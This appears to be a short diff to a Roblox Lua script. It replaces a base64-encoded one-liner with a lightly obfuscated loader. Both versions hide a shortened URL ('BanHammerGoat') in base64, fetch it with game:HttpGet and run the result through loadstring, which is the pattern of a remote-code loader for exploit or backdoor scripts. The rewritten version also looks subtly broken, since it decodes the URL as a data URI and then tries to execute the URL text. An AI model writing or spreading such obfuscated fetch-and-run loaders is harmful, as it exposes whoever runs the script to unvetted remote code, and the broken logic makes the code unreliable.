@@ -1,1 +1,3 @@
-bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vc2hvcnRlci5tZS9CYW5IYW1tZXJHb2F0IiwgdHJ1ZSkpKCkK
+local encodedURL = "aHR0cHM6Ly9zaG9ydGVyLm1lL0JhbkhhbW1lckdvYXQ="
+local decodedURL = game:HttpGet("data:text/plain;base64," .. encodedURL)
+loadstring(decodedURL)()
